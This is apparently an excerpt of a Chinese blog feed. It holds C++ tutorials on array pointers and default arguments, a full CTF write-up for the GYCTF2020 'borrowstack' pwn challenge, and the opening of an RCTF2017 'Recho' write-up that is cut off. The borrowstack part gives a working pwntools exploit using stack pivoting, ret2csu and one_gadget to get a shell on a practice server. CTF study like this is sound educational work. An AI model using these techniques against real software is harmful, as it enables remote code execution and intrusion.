class="number">10</span>];<span class="comment">// 数组名和*之间没有用括号括起来，声明了包含10个int*型元素的数组p1</span></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*p2)[<span class="number">10</span>] = &amp;arr;<span class="comment">// 数组名和*之间用括号括起来，声明了一个数组指针p2，其指向类型为int[10]的数组，那么p2的类型就是int(*)[10]</span></span><br></pre></td></tr></table></figure><hr><h1 id="声明返回一个数组指针的函数"><a href="#声明返回一个数组指针的函数" class="headerlink" title="声明返回一个数组指针的函数"></a>声明返回一个数组指针的函数</h1><p>因为函数不能用来返回一个数组，所以我们可以返回一个数组指针。最直接的方式是直接声明一个返回数组指针的函数，如下 func 函数返回一个 int (*) [10] 型数组指针:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><blockquote><p>我们可以通过从内向外的方式来理解这个声明，<code>func(int a, int b)</code> 代表调用 func 函数时要两个 int 类型的实参；<code>(*func(int a, int b))</code> 代表我们可以对函数调用的结果解引用；<code>(*func(int a, int b))[10]</code> 代表解引用 func 的调用将得到一个大小是 10 的数组；<code>int (*func(int a, int b))[10]</code> 代表数组中的元素是 int 类型。所以 func 函数的返回值类型是 <strong>int(*)[10]</strong> 。</p></blockquote><p>也可以通过 typedef 或 using 来声明类型别名，使得函数返回值看起来更加清楚，如下 func 函数返回一个 int (*) [10] 型数组指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> arrT[<span class="number">10</span>]; <span class="comment">//arrT是一个类型别名，表示的类型是含有10个整数的数组</span></span><br><span class="line"><span class="keyword">using</span> arrT = <span class="keyword">int</span>[<span class="number">10</span>];<span class="comment">//arrT的等价声明</span></span><br><span class="line"></span><br><span class="line"><span class="function">arrT* <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;<span class="comment">//func函数的返回值的类型int(*)[10]</span></span><br></pre></td></tr></table></figure><p>在 C++11 中，可以使用尾置返回类型，使用该特性对于上述 func 函数等价声明如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> -&gt; <span class="title">int</span><span class="params">(*)</span>[10]</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="函数的类型"><a href="#函数的类型" class="headerlink" title="函数的类型"></a>函数的类型</h1><p>声明一个数组的时候，会用一个变量来保存，理解数组有类型似乎很简单，但是函数的类型应该理解呢？对于一个函数，我们可以把他的参数看成输入，返回值看成输出，这样函数与外界交互的方式就由其参数和返回值决定，所以函数的类型也由其<strong>接收参数的类型</strong>和<strong>返回值的类型</strong>来决定。比如，对于上面直接的 func 函数的声明，可以输出语法树结构来看其函数的类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p><img src="2.png"></p><p>可以看到，func 函数的类型是 <code>int (*(int, int))[10]</code>，最内层括号代表其接受的参数类型是两个 <strong>int</strong> ，括号外层代表其返回值类型是 *<em>int (</em>)[10]**。</p><hr><h1 id="函数指针怎么写"><a href="#函数指针怎么写" class="headerlink" title="函数指针怎么写"></a>函数指针怎么写</h1><p>既然函数也是有类型的，那么自然可以定义函数指针，函数指针也是指针，其指向的是某个具体函数或者为空。如以下例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//funcP前面有一个*，所以可以解引用，所以funcP是一个指针；右侧是形参列表，表示funcP指向的是函数；而再观察其余部分，可知所指向函数的返回类型是int(*)[10]</span></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*(*funcP)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>]; </span><br></pre></td></tr></table></figure><p>clang 输出语法树：<br><img src="3.png"></p><p>很明显对于 funcP 是一个变量声明，而不是函数声明，funcP 是一个函数指针，其指向的函数类型为 <code>int (*(int, int))[10]</code>，所以可以初始化 funcP 指向上述所说的 func 函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>];</span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*(*funcP)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>] = func; </span><br></pre></td></tr></table></figure><hr><blockquote><p>参考资料：《C++Prime》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 函数重复声明对默认实参的影响</title>
      <link href="/2021/10/21/cpp-default-para/"/>
      <url>/2021/10/21/cpp-default-para/</url>
      
        <content type="html"><![CDATA[<p>在 C++ 中，函数只能定义一次，但是可以多次声明，通常函数的默认实参可以在声明中指定，也可以在定义中指定（我觉得一般应该<strong>在声明处定义默认实参</strong>，因为在进行函数匹配的时候仅仅需要看到函数的声明），但是对于同一个参数不能在同一个作用域中指定两次，如以下代码，将会报重复定义错误：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">10</span>))[<span class="number">10</span>];</span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">20</span>))[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>clang 输出语法树的报错信息如下：<br><img src="1.png"></p><p>但是在重复声明的时候，可以指定不同默认参数的值，此时<strong>第二次声明是在第一次声明的基础上<font color='red'>添加</font>默认参数</strong>。如以下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">10</span>))[<span class="number">10</span>];</span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a = <span class="number">10</span>, <span class="keyword">int</span> b))[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*<span class="built_in">func</span>(<span class="keyword">int</span> a, <span class="keyword">int</span> b))[<span class="number">10</span>]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*q)[<span class="number">10</span>] = <span class="keyword">reinterpret_cast</span>&lt;<span class="built_in"><span class="keyword">int</span></span>(*)[<span class="number">10</span>]&gt;(p);</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clang 输出语法树如下：<br><img src="2.png"></p><p>分析以上语法树的输出，可以得出结论，多次声明的时候指定的不同实参<strong>相当于对默认实参的添加</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GYCTF2020】borrowstack------＜栈迁移原理、ret2csu 万能 gadget、one-gadget 工具＞</title>
      <link href="/2021/10/20/pwn-borrowstack/"/>
      <url>/2021/10/20/pwn-borrowstack/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点关键字"><a href="#知识点关键字" class="headerlink" title="知识点关键字"></a>知识点关键字</h1><p>栈迁移、ROP、csu 万能 gadget、one-gadget</p><hr><h1 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h1><p>样本来自于 GYTF2020_borrowstack，<a href="https://buuoj.cn/challenges#gyctf_2020_borrowstack">BUUCTF</a> 上有练习环境</p><hr><h1 id="知识点详解"><a href="#知识点详解" class="headerlink" title="知识点详解"></a>知识点详解</h1><h2 id="ret2csu-原理"><a href="#ret2csu-原理" class="headerlink" title="ret2csu 原理"></a>ret2csu 原理</h2><ul><li><strong>动机：</strong> 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。一般来说，64 位程序都会调用 libc 中的函数，这时候，我们可以利用 x64 下的 <code>__libc_csu_init</code> 中的万能 gadgets 来间接的构造函数调用的 ROP 链。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006A0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>↑o</span><br><span class="line">.text:00000000004006A0 ; __unwind &#123;</span><br><span class="line">.text:00000000004006A0                 push    r15</span><br><span class="line">.text:00000000004006A2                 push    r14</span><br><span class="line">.text:00000000004006A4                 mov     r15d, edi</span><br><span class="line">.text:00000000004006A7                 push    r13</span><br><span class="line">.text:00000000004006A9                 push    r12</span><br><span class="line">.text:00000000004006AB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004006B2                 push    rbp</span><br><span class="line">.text:00000000004006B3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004006BA                 push    rbx</span><br><span class="line">.text:00000000004006BB                 mov     r14, rsi</span><br><span class="line">.text:00000000004006BE                 mov     r13, rdx</span><br><span class="line">.text:00000000004006C1                 sub     rbp, r12</span><br><span class="line">.text:00000000004006C4                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:00000000004006C8                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:00000000004006CC                 call    _init_proc</span><br><span class="line">.text:00000000004006D1                 test    rbp, rbp</span><br><span class="line">.text:00000000004006D4                 jz      short loc_4006F6</span><br><span class="line">.text:00000000004006D6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004006D8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:<span class="number">00000000004006E0</span></span><br><span class="line">.text:<span class="number">00000000004006E0</span> loc_4006E0:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">00000000004006E0</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004006E3</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004006E6</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004006E9</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:00000000004006ED                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:00000000004006F1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006F4                 jnz     short loc_4006E0</span><br><span class="line">.text:00000000004006F6</span><br><span class="line">.text:00000000004006F6 loc_4006F6:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:00000000004006F6                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:00000000004006FA                 pop     rbx</span><br><span class="line">.text:00000000004006FB                 pop     rbp</span><br><span class="line">.text:00000000004006FC                 pop     r12</span><br><span class="line">.text:00000000004006FE                 pop     r13</span><br><span class="line">.text:0000000000400700                 pop     r14</span><br><span class="line">.text:0000000000400702                 pop     r15</span><br><span class="line">.text:0000000000400704                 retn</span><br><span class="line">.text:0000000000400704 ; &#125; // starts at 4006A0</span><br><span class="line">.text:0000000000400704 __libc_csu_init endp</span><br></pre></td></tr></table></figure><ul><li><strong>原理：</strong><ul><li>64 位程序的函数调用的前六个参数分别存放在 <strong>rdi</strong>, <strong>rsi</strong>, <strong>rdx</strong>, <strong>rcx</strong>, <strong>r8</strong>,  <strong>r9</strong> 中，而可以注意到在 <code>__libc_csu_init</code> 中从地址 <strong>0x4006E0</strong> 到 <strong>0x4006E9</strong> 有四条汇编指令，通过 <strong>r13</strong>, <strong>r14</strong>, <strong>r15d</strong> 对 <strong>rdx</strong>, <strong>rsi</strong>, <strong>edi</strong>（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0） 进行了赋值操作，然后调用了 <strong>r12 + rbx*8</strong> 所指向的函数。这样，只需要通过操作 <strong>r13</strong>, <strong>r14</strong>, <strong>r15</strong>, <strong>r12</strong>, <strong>rbx</strong> 和 <strong>rbp</strong> 便可以间接的调用我们想调用的函数。</li><li>观察 <code>__libc_csu_init</code> 代码，发现从 <strong>0x4006FA</strong> 到 <strong>0x400704</strong> 正好有一段 <strong>pop_ret</strong> 类型的 gadget，可以对上述所需要的寄存器进行操作，这样利用这种特性，便可以实现对 <strong>rdx</strong>, <strong>rsi</strong>, <strong>edi</strong> 的操作，实现函数参数的传输，进行函数调用。</li><li>从 <strong>0x40060ED</strong> 到 <strong>0x4006F4</strong>，我们可以控制 <strong>rbx</strong> 与 <strong>rbp</strong> 的之间的关系为 <code>rbx+1 = rbp</code>，这样我们就不会执行 loc_4006E0，进而可以继续执行下面的汇编程序。</li></ul></li></ul><h2 id="栈迁移原理"><a href="#栈迁移原理" class="headerlink" title="栈迁移原理"></a>栈迁移原理</h2><p><strong>动机：</strong> 当我们的 ROP 链过长时很可能栈空间不够，所以需要一个新的地址空间来存放当前的 payload；因为开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 ROP 及进行堆漏洞利用等。<br><br></p><p><strong>原理：</strong> 函数在执行开始的时候，会进行开辟栈帧的操作，返回时会回收栈帧，这个过程主要是通过控制 rbp 和 rsp 两个寄存器来实现的，其中 rsp 代表了当前函数栈的栈顶指针，是控制栈帧增减的关键寄存器，对一个函数栈帧的操作，主要就是对其 rsp 寄存器的操作。那么要想进行对函数栈的控制，首先应该满足两条要求：<font color ='red'><strong>可以控制程序执行流、可以控制 rsp 指针</strong></font>。在程序中，<strong>leave ret</strong> 指令是非常常见的汇编指令，而仅仅通过适当利用 <strong>leave ret</strong> 便可以达到栈迁移的效果。下面通过一个小示例来演示如何通过两次 <strong>leave ret</strong> 的执行达到劫持控制流和进行栈迁移。</p><p><code>leave</code>: 相当于执行 <strong>mov rsp rbp</strong> 和 <strong>pop rbp</strong><br><code>ret</code>: 相当于执行 <strong>pop rip</strong></p><ul><li><p>1、首先试图将左边的函数栈迁移到右边的 fake 栈，关键是修改 rsp 的指向。<br><img src="1.png"></p></li><li><p>2、 将 caller’s rbp 修改为 my addr 地址，并将 ret addr 修改为 leave ret 的地址。当函数返回时，<strong>第一次执行 leave ret 指令</strong>，如下图：<br><img src="2.png"></p></li><li><p>3、在<strong>第二次执行 leave ret</strong> 的时候，同时需要劫持程序的执行流，如下图：<br><img src="3.png"></p></li></ul><p><font color='red'>这样通过两次 leave ret 的执行，就劫持了程序的控制流和栈帧。同时，注意到在原本的函数栈空间中，只需要将 <strong>caller’s rbp</strong> 修改为 <strong>fake rsp - 2</strong> 的地址，将原本的 <strong>ret addr</strong> 修改为 <strong>leave ret</strong> 的地址，将  <strong>fake rsp - 1</strong> 的内存空间设置为我们想要的汇编指令地址，即可达到栈迁移的目的。（上图的 <strong>fake stack rbp</strong> 也可以是任意值，因为控制栈帧只需要用到 <strong>rsp</strong>）</font></p><h2 id="one-gadget-工具"><a href="#one-gadget-工具" class="headerlink" title="one-gadget 工具"></a>one-gadget 工具</h2><ul><li><strong>介绍：</strong> one-gadget 是 glibc 里调用 execve(‘/bin/sh’, NULL, NULL) 的一段非常有用的 gadget。在我们能够控制 ip（也就是 pc）的时候，用 one-gadget 来做 RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用 system(“sh”)，这个时候 one-gadget 就可以搞定了。如果你想知道 one-gadget 原理，<a href="https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html">click here！</a></li><li><strong>使用：</strong> one-gadget 的使用非常简单，比如说希望在某个 libc 中找到某段启动 shell 的 gadget，只需键入以下命令：<br><code>$ one_gadget libc-2.23.so</code><br><img src="4.png"></li></ul><p>可见输出结果不仅仅给出了 gadget 对应的 libc 偏移，还给出了约束，这样只需要控制程序在满足约束的前提下跳转到对应的地址执行 gadget 便可以获得 shell。</p><hr><h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec，仅仅有栈不可执行保护。</p><div><img src="5.png" width=55%></div><p>在 IDA 中进行逆向分析：</p><div><img src="6.png" width=75%></div><ul><li>程序的流程非常简单，进行两次 read 操作，第一次 read 将数据存放在 buf 开始的数组，但是 buf 到 rbp 的偏移仅仅有 0x60 个字节，故第一个 read 有 16 个字节的栈溢出，可以覆盖 rbp 和 返回地址。</li><li>仅仅两个内存空间的溢出不足以我们进行 ROP 链的构造，考虑到下面还有一个 read 函数，将数据读入以 bank 为起始地址的内存空间，该段空间是位于可读可写的 .bss 段的，那可以<strong>考虑将 ROP 链通过第二个 read 写入到 .bss 段，而第一个 read 用来进行栈迁移</strong>。</li><li>当进行栈迁移后，函数的栈帧将移到 .bss 段，通过观察 IDA 可以发现在距离 .bss 段的 0x30 个低地址处就是 got 表，如果我们直接将栈迁移到 bank 处，则 ROP 链中的<strong>函数调用可能会导致栈向下增长到覆盖掉 got 表</strong>，这会使得一些外部函数的全局偏移地址被修改，导致程序崩溃。针对这种问题的解决方法是将迁移后的栈向高地址抬高一段距离，确保函数的调用不会覆盖掉 got 表。</li></ul><h2 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h2><ul><li><p>第一个 payload 用来进行栈迁移，将返回地址覆盖为 leave ret 的地址，将 caller’s rbp 覆盖为转移的新栈帧的 rsp-2 的地址。</p></li><li><p>第二个 payload 用来构造 ROP 链，为了不覆盖掉 got 表，将新的栈帧向 bank 的高地址方向抬高 0x50 个字节的偏移，然后通过调用 puts 函数，泄露出 puts 的全局地址，以计算 libc 的基址。再通过 read 函数将 libc+one_gadget 的地址读入到程序来劫持程序流，获取 shell。<strong>但是由于 read 函数需要三个参数，在 ROPgadget 查看可用的 gadget 后，发现没有对 rdx 的操作的 pop_ret 指令序列</strong>，故采用 <code>__libc_csu_init</code> 中的一段万能 gadget 来执行 read 函数。<br><img src="7.png"></p></li><li><p>利用 one_gadget 查找所依赖的库的 gadget，如下：<br><img src="8.png"></p></li><li><p>选用合适的 one_gadget，加上 libc 的基址后，通过 read 函数将其读入到 <strong>new rsp + 0x8*9</strong> 的内存空间里（该内存空间便是存放 read 返回地址的地方）。构造的 ROP 链如下图所示：<br><img src="9.png"></p></li><li><p>为了满足 one_gadget 的约束条件，最后一次读入 libc+one_gadget 的同时，将后面的 0x50 个字节置为 0。</p></li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>为了理解新栈帧为什么要抬高一定的字节，我们可以通过动态调试来查看 got 表中发生了什么。</p><ul><li><p>比如我将偏移(new rsp - bank）设置为 0x30，运行程序，在 main 函数返回前，got 表中的数据都是正确的：<br><img src="10.png"></p></li><li><p>而在执行到 ROP 链中 puts 函数时，got 表被修改了：<br><img src="11.png"></p></li><li><p>通过几次尝试，发现将偏移值设置为 0x50 便可以正确的运行程序获取 shell。</p></li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Debug == <span class="number">1</span>:</span><br><span class="line">libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">one_gadget = <span class="number">0x4f432</span></span><br><span class="line">p = process(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_name = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25202</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./borrowstack&quot;</span>)</span><br><span class="line">bank_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">csu_init_pop = <span class="number">0x4006FA</span></span><br><span class="line">csu_init_call = <span class="number">0x4006E0</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">new_stack_sp = bank_addr + offset</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(new_stack_sp - <span class="number">0x10</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Tell me what you want\n&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!You can check and use your borrow stack now!\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(new_stack_sp-<span class="number">0x10</span> - bank_addr) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) \</span><br><span class="line">+ p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+ p64(csu_init_pop) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) +p64(<span class="number">0x100</span>) \</span><br><span class="line">+ p64(new_stack_sp + <span class="number">0x8</span>*<span class="number">9</span>) + p64(<span class="number">0</span>) + p64(csu_init_call) </span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendline(p64(libc_base + one_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span>)</span><br><span class="line"><span class="comment"># print(hex(libc_base + libc.sym[&#x27;puts&#x27;]))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://github.com/david942j/one_gadget">one-gadget</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层技术 </tag>
            
            <tag> pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【RCTF2017】Recho------＜Linux 的系统调用、PLT 和 GOT 表＞</title>
      <link href="/2021/10/20/pwn-recho/"/>
      <url>/2021/10/20/pwn-recho/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点关键字"><a href="#知识点关键字" class="headerlink" title="知识点关键字"></a>知识点关键字</h1><p>栈溢出、系统调用、ROP、pwntools 中的 shutdown 方法、plt 表和 got 表</p><hr><h1 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h1><p>样本来自于 RCTF2017_Recho，<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4986&page=1">攻防世界</a>上有练习环境</p><hr><h1 id="知识点详解"><a href="#知识点详解" class="headerlink" title="知识点详解"></a>知识点详解</h1><h2 id="Linux-的系统调用"><a href="#Linux-的系统调用" class="headerlink" title="Linux 的系统调用"></a>Linux 的系统调用</h2><p>最直观的理解，<strong>系统调用</strong>是操作系统提供给用户的一系列对计算机资源进行控制的方法，用户可以通过系统调用来请求使用计算机资源。比如 Linux 系统中，常用的文件 I/O，进程控制等函数就是简介使用系统调用方法的函数。在 Linux 中 X86 架构下的 32 位系统调用和 64 位系统调用是不同的，主要体现在<strong>传参方式不同</strong>、<strong>系统调用号不同</strong>、<strong>调用方式不同</strong>。</p><p><font color=';red'>32 位：</font></p><ul><li>传参方式：系统调用号存放在 <strong>eax</strong>，参数从左到右分别存放在 <strong>ebx，ecx，edx，esi，edi，ebp</strong> 寄存器中，返回值存在 <strong>eax</strong> 寄存器</li><li>调用号：sys_read 的调用号为 <strong>3</strong>，sys_write 的调用号为 <strong>4</strong>，sys_execve 的调用号为 <strong>11</strong></li><li>调用方式：<strong>使用 int 0x80 软中端指令进行系统调用</strong> </li></ul><p><font color=';red'>64位：</font></p><ul><li>传参方式：系统调用号存放在 <strong>rax</strong>，参数从左到右分别存放在 <strong>rdi，rsi，rdx，r10，r8，r9</strong> 寄存器中，返回值存在 <strong>rax</strong> 寄存器 <strong>（和普通函数调用仅仅在第四个参数那不同，普通的函数是参数放入 rcx）</strong></li><li>调用号：sys_read 的调用号为 <strong>0</strong>，sys_write 的调用号为 <strong>1</strong>，sys_execve 的调用号为 <strong>59</strong></li><li>调用方式：<strong>使用 syscall 函数进行系统调用</strong> </li></ul><p>32 位图解：<br><img src="1.jpg"></p><p>64 位图解：<br><img src="2.jpg"></p><h2 id="PLT-和-GOT-表"><a href="#PLT-和-GOT-表" class="headerlink" title="PLT 和 GOT 表"></a>PLT 和 GOT 表</h2><ul><li><code>延迟绑定</code>：<strong>当程序第一次调用外部库的函数的时候，才对该函数的进行绑定（即符号查找和重定位等），将函数在内存中的真实地址写入 .got.plt 中的对应表项</strong>。延迟绑定是一种动态链接的优化技术，如果未采用延迟绑定技术，则程序开始执行时，动态链接器都要先进行一次链接工作，寻找并装载所需要的共享对象，然后进行符号查找地址重定位等工作，这些工作必然会减慢程序的启动速度。</li><li>ELF 便采用了延迟绑定的技术，通过 PLT 来实现。</li></ul><p>在 gdb 动态调试的时候，会看到汇编代码中若调用了库函数，如 printf，其对应的指令便是 <code>call printf@plt</code>，这个意思其实就是调用外部库文件中函数，那么 ELF 是怎么执行这个过程的呢？先从几个 ELF 中 section 说起：</p><ul><li><strong><code>.got</code></strong><br>GOT（Global Offset 